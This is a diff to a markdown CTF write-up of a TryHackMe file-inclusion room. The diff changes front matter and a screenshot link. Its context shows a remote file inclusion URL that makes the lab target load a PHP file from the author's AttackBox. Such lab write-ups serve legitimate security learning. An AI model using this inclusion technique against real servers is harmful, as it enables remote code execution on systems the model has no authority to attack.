@@ -1,6 +1,5 @@
 ---
 title: Remote Code Execution CTF
-weight: 4
 ---
 
 [Link to the exercise](https://tryhackme.com/room/fileinc)
@@ -37,7 +36,7 @@ http://10.10.55.248/playground.php?file=http://10.10.224.87:8000/hostname.php
 
 (where `.55.248` is the attacked machine and `.224.87` is my AttackBox instance).
 
-![Screenshot 2023-01-04 at 21.18.30](/public/Screenshot%202023-01-04%20at%2021.18.30.png)
+![](/public/lfi-ctf-rce.png)
 
 Good. The string was included.
 
